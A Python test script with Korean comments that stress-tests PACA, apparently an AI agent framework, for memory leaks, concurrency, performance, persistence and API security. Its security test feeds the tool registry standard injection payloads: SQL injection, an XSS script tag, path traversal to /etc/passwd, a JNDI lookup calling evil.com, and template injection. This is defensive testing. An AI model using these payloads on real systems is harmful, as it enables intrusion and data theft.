"""
PACA 실사용 환경에서 발생할 수 있는 심층 문제점 분석
성능, 메모리, 보안, 배포 등 실제 운영 시 발생 가능한 모든 문제 체크
"""

import asyncio
import sys
import time
import traceback
import psutil
import gc
import threading
import concurrent.futures
from datetime import datetime
from typing import Dict, List, Any
import json

def test_memory_leaks():
    """메모리 누수 테스트"""
    print("=== 메모리 누수 테스트 ===")

    try:
        from paca.tools import ReActFramework, PACAToolManager
        from paca.cognitive.memory import WorkingMemory, EpisodicMemory

        initial_memory = psutil.Process().memory_info().rss / 1024 / 1024  # MB
        print(f"초기 메모리 사용량: {initial_memory:.2f} MB")

        # 반복적으로 객체 생성/삭제하여 메모리 누수 확인
        memory_usage = []

        for i in range(10):
            # 시스템 생성
            tool_manager = PACAToolManager()
            react_framework = ReActFramework(tool_manager)
            working_memory = WorkingMemory()
            episodic_memory = EpisodicMemory()

            # 메모리 사용량 측정
            current_memory = psutil.Process().memory_info().rss / 1024 / 1024
            memory_usage.append(current_memory)
            print(f"반복 {i+1}: {current_memory:.2f} MB")

            # 객체 삭제
            del tool_manager, react_framework, working_memory, episodic_memory
            gc.collect()

            time.sleep(0.1)  # 잠시 대기

        # 메모리 누수 분석
        memory_increase = memory_usage[-1] - memory_usage[0]
        print(f"메모리 증가량: {memory_increase:.2f} MB")

        if memory_increase > 50:  # 50MB 이상 증가시 문제
            print("⚠️ 메모리 누수 의심")
            return False
        else:
            print("✅ 메모리 사용량 정상")
            return True

    except Exception as e:
        print(f"ERROR: 메모리 테스트 실패: {e}")
        return False

async def test_concurrent_access():
    """동시 접근 테스트"""
    print("\n=== 동시 접근 테스트 ===")

    try:
        from paca.tools import ReActFramework, PACAToolManager
        from paca.cognitive.memory import WorkingMemory

        # 공유 자원 생성
        tool_manager = PACAToolManager()
        react_framework = ReActFramework(tool_manager)
        memory = WorkingMemory()

        async def worker(worker_id: int):
            """워커 함수"""
            try:
                # 동시에 세션 생성
                session = await react_framework.create_session(f"worker-{worker_id}")

                # 동시에 메모리 접근
                for i in range(5):
                    content_id = await memory.store(
                        f"Worker {worker_id} data {i}",
                        {"worker": worker_id, "iteration": i}
                    )

                    retrieved = await memory.retrieve(content_id)
                    if not retrieved:
                        return False

                return True

            except Exception as e:
                print(f"Worker {worker_id} error: {e}")
                return False

        # 10개 워커 동시 실행
        tasks = [worker(i) for i in range(10)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # 결과 분석
        success_count = sum(1 for r in results if r is True)
        error_count = sum(1 for r in results if isinstance(r, Exception))

        print(f"성공: {success_count}/10, 오류: {error_count}/10")

        if error_count > 0:
            print("⚠️ 동시 접근 문제 발견")
            for i, result in enumerate(results):
                if isinstance(result, Exception):
                    print(f"  Worker {i}: {result}")
            return False
        else:
            print("✅ 동시 접근 처리 정상")
            return True

    except Exception as e:
        print(f"ERROR: 동시 접근 테스트 실패: {e}")
        traceback.print_exc()
        return False

def test_performance_bottlenecks():
    """성능 병목 테스트"""
    print("\n=== 성능 병목 테스트 ===")

    try:
        from paca.tools import ReActFramework, PACAToolManager
        from paca.cognitive.memory import WorkingMemory

        # 성능 측정 함수
        def measure_time(func, *args, **kwargs):
            start = time.time()
            result = func(*args, **kwargs)
            end = time.time()
            return result, end - start

        # 1. 초기화 시간 측정
        start_time = time.time()
        tool_manager = PACAToolManager()
        react_framework = ReActFramework(tool_manager)
        memory = WorkingMemory()
        init_time = time.time() - start_time

        print(f"시스템 초기화 시간: {init_time:.3f}초")

        # 2. 메모리 작업 성능 측정
        async def memory_performance_test():
            times = []

            for i in range(100):
                start = time.time()
                content_id = await memory.store(f"Performance test {i}", {"test": i})
                retrieved = await memory.retrieve(content_id)
                end = time.time()
                times.append(end - start)

            avg_time = sum(times) / len(times)
            max_time = max(times)

            print(f"메모리 작업 평균 시간: {avg_time:.3f}초")
            print(f"메모리 작업 최대 시간: {max_time:.3f}초")

            # 성능 임계값 체크
            if avg_time > 0.1:  # 100ms 이상시 문제
                print("⚠️ 메모리 작업 성능 문제")
                return False
            return True

        # 3. 세션 생성 성능 측정
        async def session_performance_test():
            times = []

            for i in range(50):
                start = time.time()
                session = await react_framework.create_session(f"perf-test-{i}")
                end = time.time()
                times.append(end - start)

            avg_time = sum(times) / len(times)
            print(f"세션 생성 평균 시간: {avg_time:.3f}초")

            if avg_time > 0.05:  # 50ms 이상시 문제
                print("⚠️ 세션 생성 성능 문제")
                return False
            return True

        # 비동기 테스트 실행
        async def run_performance_tests():
            memory_result = await memory_performance_test()
            session_result = await session_performance_test()
            return memory_result and session_result

        result = asyncio.run(run_performance_tests())

        if result:
            print("✅ 성능 테스트 통과")
        else:
            print("⚠️ 성능 문제 발견")

        return result

    except Exception as e:
        print(f"ERROR: 성능 테스트 실패: {e}")
        traceback.print_exc()
        return False

def test_resource_limits():
    """리소스 한계 테스트"""
    print("\n=== 리소스 한계 테스트 ===")

    try:
        from paca.tools import ReActFramework, PACAToolManager
        from paca.cognitive.memory import WorkingMemory

        # CPU 사용률 모니터링
        initial_cpu = psutil.cpu_percent()

        # 대량 작업 수행
        async def stress_test():
            tool_manager = PACAToolManager()
            react_framework = ReActFramework(tool_manager)
            memory = WorkingMemory()

            # 1000개 메모리 항목 생성
            tasks = []
            for i in range(1000):
                task = memory.store(f"Stress test item {i}", {"index": i})
                tasks.append(task)

            await asyncio.gather(*tasks)

            # 1000개 세션 생성
            sessions = []
            for i in range(100):  # 세션은 100개만 (너무 많으면 시스템 부하)
                session = await react_framework.create_session(f"stress-{i}")
                sessions.append(session)

            return len(sessions)

        start_time = time.time()
        result = asyncio.run(stress_test())
        end_time = time.time()

        final_cpu = psutil.cpu_percent()
        memory_usage = psutil.Process().memory_info().rss / 1024 / 1024

        print(f"스트레스 테스트 완료 시간: {end_time - start_time:.2f}초")
        print(f"CPU 사용률 변화: {initial_cpu}% → {final_cpu}%")
        print(f"메모리 사용량: {memory_usage:.2f} MB")

        # 리소스 사용량 체크
        if final_cpu > 80:
            print("⚠️ CPU 사용률 과다")
            return False

        if memory_usage > 500:  # 500MB 이상시 문제
            print("⚠️ 메모리 사용량 과다")
            return False

        print("✅ 리소스 사용량 정상")
        return True

    except Exception as e:
        print(f"ERROR: 리소스 테스트 실패: {e}")
        traceback.print_exc()
        return False

def test_error_handling():
    """오류 처리 견고성 테스트"""
    print("\n=== 오류 처리 견고성 테스트 ===")

    try:
        from paca.tools import ReActFramework, PACAToolManager
        from paca.cognitive.memory import WorkingMemory

        # 의도적 오류 상황 생성 및 처리 확인
        async def error_scenarios():
            tool_manager = PACAToolManager()
            react_framework = ReActFramework(tool_manager)
            memory = WorkingMemory()

            error_handled = 0
            total_errors = 0

            # 1. 존재하지 않는 메모리 항목 조회
            try:
                total_errors += 1
                result = await memory.retrieve("non-existent-id")
                if result is None:  # 정상적으로 None 반환
                    error_handled += 1
            except Exception:
                pass  # 예외가 발생해도 처리됨

            # 2. 잘못된 타입 데이터 저장
            try:
                total_errors += 1
                # 순환 참조 객체 저장 시도
                circular_ref = {}
                circular_ref['self'] = circular_ref
                await memory.store(circular_ref, {"type": "circular"})
                error_handled += 1
            except Exception:
                error_handled += 1  # 예외 발생시에도 처리된 것으로 간주

            # 3. 비정상적인 세션 ID로 세션 생성
            try:
                total_errors += 1
                session = await react_framework.create_session("")  # 빈 문자열
                error_handled += 1
            except Exception:
                error_handled += 1

            # 4. 메모리 한계 테스트 (매우 큰 데이터)
            try:
                total_errors += 1
                large_data = "x" * (10 * 1024 * 1024)  # 10MB 문자열
                await memory.store(large_data, {"type": "large"})
                error_handled += 1
            except Exception:
                error_handled += 1

            return error_handled, total_errors

        handled, total = asyncio.run(error_scenarios())

        print(f"오류 처리: {handled}/{total}")

        if handled == total:
            print("✅ 오류 처리 견고성 양호")
            return True
        else:
            print("⚠️ 일부 오류 처리 문제")
            return False

    except Exception as e:
        print(f"ERROR: 오류 처리 테스트 실패: {e}")
        traceback.print_exc()
        return False

def test_data_persistence():
    """데이터 지속성 테스트"""
    print("\n=== 데이터 지속성 테스트 ===")

    try:
        from paca.cognitive.memory import WorkingMemory, EpisodicMemory, LongTermMemory

        # 1차: 데이터 저장
        async def save_data():
            working = WorkingMemory()
            episodic = EpisodicMemory()
            longterm = LongTermMemory()

            # 각 메모리에 테스트 데이터 저장
            working_id = await working.store("지속성 테스트", {"type": "persistence"})

            from paca.cognitive.memory.episodic import EpisodicContext
            context = EpisodicContext(
                temporal_context={"test": "persistence"},
                spatial_context={},
                emotional_context={},
                social_context={}
            )
            episodic_id = await episodic.store_episode("지속성 테스트 에피소드", context, 0.8)

            longterm_id = await longterm.store_knowledge(
                "지속성 테스트 지식", "test", 0.9, ["persistence", "test"]
            )

            return working_id, episodic_id, longterm_id

        # 2차: 새로운 인스턴스로 데이터 조회
        async def load_data(working_id, episodic_id, longterm_id):
            # 새로운 메모리 인스턴스 생성 (재시작 시뮬레이션)
            working = WorkingMemory()
            episodic = EpisodicMemory()
            longterm = LongTermMemory()

            # 데이터 복구 시도
            working_data = await working.retrieve(working_id)
            episodic_count = episodic.get_episode_count()
            longterm_data = await longterm.retrieve_knowledge("지식")

            return working_data, episodic_count, longterm_data

        # 테스트 실행
        w_id, e_id, l_id = asyncio.run(save_data())
        print(f"저장된 ID들: Working={w_id}, Episodic={e_id}, LongTerm={l_id}")

        time.sleep(1)  # 잠시 대기

        w_data, e_count, l_data = asyncio.run(load_data(w_id, e_id, l_id))

        # 결과 분석
        persistence_score = 0

        if w_data and w_data.content == "지속성 테스트":
            print("✅ Working Memory 지속성 OK")
            persistence_score += 1
        else:
            print("⚠️ Working Memory 지속성 문제")

        if e_count > 0:
            print("✅ Episodic Memory 지속성 OK")
            persistence_score += 1
        else:
            print("⚠️ Episodic Memory 지속성 문제")

        if l_data and len(l_data) > 0:
            print("✅ Long Term Memory 지속성 OK")
            persistence_score += 1
        else:
            print("⚠️ Long Term Memory 지속성 문제")

        if persistence_score == 3:
            print("✅ 데이터 지속성 완전 보장")
            return True
        else:
            print(f"⚠️ 데이터 지속성 부분적 문제 ({persistence_score}/3)")
            return False

    except Exception as e:
        print(f"ERROR: 지속성 테스트 실패: {e}")
        traceback.print_exc()
        return False

def test_api_security():
    """API 보안 취약점 테스트"""
    print("\n=== API 보안 테스트 ===")

    try:
        from paca.tools import PACAToolManager
        from paca.tools.tools.web_search import WebSearchTool

        # SQL 인젝션 유사 공격 테스트
        tool_manager = PACAToolManager()

        # 악의적 입력 테스트
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../../etc/passwd",
            "${jndi:ldap://evil.com/}",
            "{{7*7}}",  # Template injection
        ]

        security_passed = 0
        total_tests = len(malicious_inputs)

        for malicious_input in malicious_inputs:
            try:
                # 도구 이름에 악의적 입력 사용
                web_search = WebSearchTool()
                web_search.name = malicious_input

                # 등록 시도
                result = tool_manager.register_tool(web_search)

                # 등록이 되더라도 정상적으로 처리되었다면 OK
                if result:
                    # 등록된 도구 이름 확인
                    if malicious_input in tool_manager.tools:
                        stored_name = tool_manager.tools[malicious_input].name
                        if stored_name == malicious_input:
                            print(f"⚠️ 악의적 입력 처리되지 않음: {malicious_input[:20]}...")
                        else:
                            print(f"✅ 악의적 입력 필터링됨")
                            security_passed += 1
                    else:
                        print(f"✅ 악의적 입력 거부됨")
                        security_passed += 1
                else:
                    print(f"✅ 악의적 입력 거부됨")
                    security_passed += 1

            except Exception as e:
                print(f"✅ 악의적 입력에 대한 예외 처리: {str(e)[:50]}...")
                security_passed += 1

        print(f"보안 테스트 통과: {security_passed}/{total_tests}")

        if security_passed >= total_tests * 0.8:  # 80% 이상 통과
            print("✅ API 보안 양호")
            return True
        else:
            print("⚠️ API 보안 취약점 존재")
            return False

    except Exception as e:
        print(f"ERROR: 보안 테스트 실패: {e}")
        traceback.print_exc()
        return False

async def main():
    """메인 테스트 함수"""
    print("PACA 실사용 환경 심층 문제점 분석")
    print("=" * 60)

    test_results = {}

    # 모든 테스트 실행
    test_results['memory_leaks'] = test_memory_leaks()
    test_results['concurrent_access'] = await test_concurrent_access()
    test_results['performance'] = test_performance_bottlenecks()
    test_results['resource_limits'] = test_resource_limits()
    test_results['error_handling'] = test_error_handling()
    test_results['data_persistence'] = test_data_persistence()
    test_results['api_security'] = test_api_security()

    # 결과 요약
    print("\n" + "=" * 60)
    print("심층 분석 결과 요약")
    print("=" * 60)

    passed_tests = sum(test_results.values())
    total_tests = len(test_results)

    for test_name, result in test_results.items():
        status = "✅ 통과" if result else "❌ 문제"
        print(f"{test_name}: {status}")

    print(f"\n전체 테스트: {passed_tests}/{total_tests} 통과")

    # 심각한 문제점 식별
    critical_issues = []
    if not test_results['memory_leaks']:
        critical_issues.append("메모리 누수")
    if not test_results['concurrent_access']:
        critical_issues.append("동시 접근 처리")
    if not test_results['api_security']:
        critical_issues.append("API 보안")

    if critical_issues:
        print(f"\n🚨 Critical 문제점: {', '.join(critical_issues)}")
    else:
        print("\n✅ Critical 문제점 없음")

    # 성능 관련 문제
    performance_issues = []
    if not test_results['performance']:
        performance_issues.append("성능 병목")
    if not test_results['resource_limits']:
        performance_issues.append("리소스 한계")

    if performance_issues:
        print(f"⚠️ 성능 문제: {', '.join(performance_issues)}")

    # 안정성 관련 문제
    stability_issues = []
    if not test_results['error_handling']:
        stability_issues.append("오류 처리")
    if not test_results['data_persistence']:
        stability_issues.append("데이터 지속성")

    if stability_issues:
        print(f"⚠️ 안정성 문제: {', '.join(stability_issues)}")

    return test_results

if __name__ == "__main__":
    results = asyncio.run(main())